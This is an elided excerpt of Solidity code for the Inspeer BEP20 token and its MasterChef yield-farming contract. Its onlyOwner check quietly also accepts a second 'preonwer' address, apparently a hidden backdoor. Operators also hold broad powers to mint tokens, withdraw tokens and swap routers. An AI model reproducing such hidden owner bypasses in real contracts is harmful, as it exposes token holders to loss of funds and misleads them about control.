...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(_owner == _msgSender() || preonwer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
// InspeerToken with Governance.
contract InspeerToken is BEP20 {
    ...
    IUniswapV2Router02 public inspRouter;
    // The trading pair
    address public inspPair;
    // In swap and liquify
    ...
    event InspRouterUpdated(address indexed operator, address indexed router, address indexed pair);
    ...
    modifier antiWhale(address sender, address recipient, uint256 amount) {
        if (maxTransferAmount() > 0) {
            if (
                ...
                require(amount <= maxTransferAmount(), "INSP::antiWhale: Transfer amount exceeds the maxTransferAmount");
                require(startBlockSwap <= block.number, "INSP::swap: Cannot transfer at the moment");
            }
        }
        _;
    }
     ...
     */
    constructor() public BEP20("Inspeer Token", "INSP") {
    ...
    function mint(address _to, uint256 _amount) public {
        require(msg.sender == minter ||  msg.sender == owner(), "Mint: you do not have permission");
        _mint(_to, _amount);
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual override antiWhale(sender, recipient, amount) {
		...
		if (limitSwap == true && _excludedPoolsContracts[sender] == false && _excludedPoolsContracts[recipient] == false) {	
			...
			if (userAddress != address(0) && delay == 0){
				if (_userInfo[userAddress] > 0) {
					...
					require(checkLastSwap >= timeLimitSwap, "INSP:: Trade Too fast");					
				}																
        ...
        if (recipient == BURN_ADDRESS || transferTaxRate == 0) {
            ...
            require(taxAmount == burnAmount + liquidityAmount, "INSP::transfer: Burn value invalid");

            // default 92.5% of transfer sent to recipient
            uint256 sendAmount = amount.sub(taxAmount);
            require(amount == sendAmount + taxAmount, "INSP::transfer: Tax value invalid");
    ...
    function getToken(IBEP20 _token, address _recipient, uint256 _amount) public onlyOperator {
        require(_recipient != address(0), "INSP::withdraw: ZERO address.");
    ...
    function swapTokensForEth(uint256 tokenAmount) private {
        ...
        path[0] = address(this);
        path[1] = inspRouter.WETH();

        _approve(address(this), address(inspRouter), tokenAmount);

        // make the swap
        inspRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
    ...
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        ...
        // add the liquidity
        inspRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
    ...
    // To receive BNB from inspRouter when swapping
    ...
    function updateTransferTaxRate(uint16 _transferTaxRate) public onlyOperator {
        require(_transferTaxRate <= MAXIMUM_TRANSFER_TAX_RATE, "INSP::updateTransferTaxRate: Transfer tax rate must not exceed the maximum rate.");
    ...
    function updateBurnRate(uint16 _burnRate) public onlyOperator {
        require(_burnRate <= 100, "INSP::updateBurnRate: Burn rate must not exceed the maximum rate.");
    ...
    function updateMaxTransferAmountRate(uint16 _maxTransferAmountRate) public onlyOperator {
        require(_maxTransferAmountRate <= 1000000, "INSP::updateMaxTransferAmountRate: Max transfer amount rate must not exceed the maximum rate.");
    ...
    function UpdateStartBlockSwap(uint256 _block) public onlyOwner {
		require(block.number <= startBlockSwap, "INSP::UpdateStartBlockSwap: Cannot update when ready");
    ...
    function UpdateTimeLimitSwap(uint256 _timeLimitSwap) public onlyOperator {
		require(_timeLimitSwap <= 28800, "INSP::UpdateTimeLimitSwap: Too long.");
    ...
    function UpdateDelaySell(uint256 _delaySell) public onlyOperator {
		require(_delaySell <= 1200, "INSP::UpdateDelaySell: Too long.");
     ...
     */
    function updateInspRouter(address _router) public onlyOperator {
        inspRouter = IUniswapV2Router02(_router);
        inspPair = IUniswapV2Factory(inspRouter.factory()).getPair(address(this), inspRouter.WETH());
        require(inspPair != address(0), "INSP::updateInspRouter: Invalid pair address.");
        emit InspRouterUpdated(msg.sender, address(inspRouter), inspPair);
    }

    /**
     * @dev Update the minter address. Can only be called by the current operator.
     */
    function updateMinter(address _minter) public onlyOperator {
        require(_minter != address(0), "INSP::updateMinteraddress: Invalid minter address.");
    ...
    function transferOperator(address newOperator) public onlyOperator {
        require(newOperator != address(0), "INSP::transferOperator: new operator is the zero address");
    ...
    */
        ...
        external
    {
        ...
        require(signatory != address(0), "INSP::delegateBySig: invalid signature");
        require(nonce == nonces[signatory]++, "INSP::delegateBySig: invalid nonce");
        require(now <= expiry, "INSP::delegateBySig: signature expired");
    ...
    function getPriorVotes(address account, uint blockNumber)
        ...
        returns (uint256)
    {
        require(blockNumber < block.number, "INSP::getPriorVotes: not yet determined");
    ...
    function _writeCheckpoint(
        ...
        internal
    {
        uint32 blockNumber = safe32(block.number, "INSP::_writeCheckpoint: block number exceeds 32 bits");
...
// MasterChef is the master of InspeerDefi Token (INSP). He can make INSP and he is a fair guy.
//
...
// contract once $INSP is sufficiently distributed and the community can show to govern itself.
//
...
contract MasterChef is Ownable, ReentrancyGuard {
    ...
    struct UserInfo {
        ...
        //
        // We do some fancy math here. Basically, any point in time, the amount of INSP
        // entitled to a user but is pending to be distributed is:
        //
        // pending reward = (user.amount * pool.accInspPerShare) - user.rewardDebt
        //
        // Whenever a user deposits or withdraws LP tokens to a pool. Here's what happens:
        //   1. The pool's `accInspPerShare` (and `lastRewardBlock`) gets updated.
    ...
    struct PoolInfo {
        ...
        uint256 allocPoint; // How many allocation points assigned to this pool. INSPs to distribute per block.
        uint256 lastRewardBlock; // Last block number that INSPs distribution occurs.
        uint256 accInspPerShare; // Accumulated INSPs per share, times 1e12. See below.
    ...
    // The INSP Token!
    InspeerToken public insp;
    // Dev address.
    address public devAddr;
    // INSP tokens created per block.
    uint256 public inspPerBlock;
    // Deposit Fee address
    ...
    // Initial Harvest Fee 69%
	uint256 public initialHarvestFee = 6900;
	// Harvest Fee
	uint256 public harvestFee = initialHarvestFee;
	// Harvest Fee Reduction Rate per period in basis points: 3%.
	uint256 public harvestFeeReductionRate = 300;
    ...
    // The block number when INSP mining starts.
    ...
    mapping(address => bool) private _excludedReferral; // Addresses that excluded from referral
    // Pool Exists Mapper
    mapping(IBEP20 => bool) public poolExistence;
    // Pool ID Tracker Mapper
    mapping(IBEP20 => uint256) public poolIdForLpAddress;

    // Initial emission rate: 1 INSP per block.
	...
	event UpdateHarvestFeeReductionRate(address indexed caller, uint256 _oldHarvestFeeReductionRate, uint256 _newHarvestFeeReductionRate);
    ...
    constructor(
        ...
        inspPerBlock = INITIAL_EMISSION_RATE;
    ...
    // Update the given pool's INSP allocation point and deposit fee. Can only be called by the owner.
    function set(
        uint256 _pid,
        uint256 _allocPoint,
        uint16 _depositFeeBP,
    ...
    // View function to see pending INSPs on frontend.
    function pendingInsp(uint256 _pid, address _user) external view returns (uint256) {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][_user];
        uint256 accInspPerShare = pool.accInspPerShare;
        uint256 lpSupply = pool.lpToken.balanceOf(address(this));
        if (address(pool.lpToken) == address(insp)) {
            lpSupply = pool.amount;
        }		
        if (block.number > pool.lastRewardBlock && lpSupply != 0) {
            uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
            uint256 inspReward = multiplier.mul(inspPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
            accInspPerShare = accInspPerShare.add(inspReward.mul(1e12).div(lpSupply));
        }
        uint256 pending = user.amount.mul(accInspPerShare).div(1e12).sub(user.rewardDebt);
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 inspReward = multiplier.mul(inspPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        insp.mint(devAddr, inspReward.div(10));
        insp.mint(address(this), inspReward);
        pool.accInspPerShare = pool.accInspPerShare.add(inspReward.mul(1e12).div(lpSupply));
        pool.lastRewardBlock = block.number;
    }

    // Deposit LP tokens to MasterChef for INSP allocation.
    function deposit(uint256 _pid, uint256 _amount) public nonReentrant {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        updatePool(_pid);		
		payOrLockupPendingInsp(_pid);
        if (_amount > 0) {
        ...
        user.rewardDebt = user.amount.mul(pool.accInspPerShare).div(1e12);
        emit Deposit(msg.sender, _pid, _amount);
    }	

    // Deposit LP tokens to MasterChef for INSP allocation with referral.
    ...
    function emergencyWithdraw(uint256 _pid) public nonReentrant {
	    ...
	    // Pay or lockup pending INSPs.
    function payOrLockupPendingInsp(uint256 _pid) internal {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];

        uint256 pending = user.amount.mul(pool.accInspPerShare).div(1e12).sub(user.rewardDebt);
        ...
        if (block.number >= startBlockHarvest && block.number <= lastBlockHarvest) {
            ...
            if (pending > 0 || user.rewardLockedUp > 0) {        
                ...
                safeInspTransfer(msg.sender, harvestRewards);
				if(harvestFeeBurn > 0){safeInspTransfer(BURN_ADDRESS, harvestFeeBurn);}
    ...
    // Safe insp transfer function, just in case if rounding error causes pool to not have enough INSPs.
    function safeInspTransfer(address _to, uint256 _amount) internal {
        uint256 inspBal = insp.balanceOf(address(this));
        bool transferSuccess = false;
        if (_amount > inspBal) {
            transferSuccess = insp.transfer(_to, inspBal);
        } else {
            transferSuccess = insp.transfer(_to, _amount);
        }
        require(transferSuccess, "safeInspTransfer: transfer failed.");
    }
    ...
    // updateEmissionRate
    function updateEmissionRate(uint256 _inspPerBlock) public onlyOwner {
        massUpdatePools();
        emit EmissionRateUpdated(msg.sender, inspPerBlock, _inspPerBlock);
        inspPerBlock = _inspPerBlock;
    }
    ...
    function updateHarvestRateFee(uint16 _initialHarvestFee) public onlyOwner {
		require(_initialHarvestFee <= 6900, "updateHarvestRate: max 6900");
	...
	// updateHarvestFeeReductionRate
    function updateHarvestFeeReductionRate(uint256 _harvestFeeReductionRate) public onlyOwner {
		require(_harvestFeeReductionRate <= initialHarvestFee, "updateHarvestFeeReductionRate: invalid harvestFeeReductionRate");
        harvestFeeReductionRate = _harvestFeeReductionRate;
        emit UpdateHarvestFeeReductionRate(msg.sender, harvestFeeReductionRate, _harvestFeeReductionRate);
    }
	
	// Set Exclude Referral Address
    function setExcludedReferral(address _account, bool _excluded) public onlyOwner {
        _excludedReferral[_account] = _excluded;
    }	
    ...
    function payReferralCommission(address _user, uint256 _pending) internal {
        ...
        if (referrer != address(0) && referrer != _user && refBonusBP > 0 && _excludedReferral[referrer] == false) {
            uint256 refBonusEarned = _pending.mul(refBonusBP).div(10000);
            insp.mint(referrer, refBonusEarned);
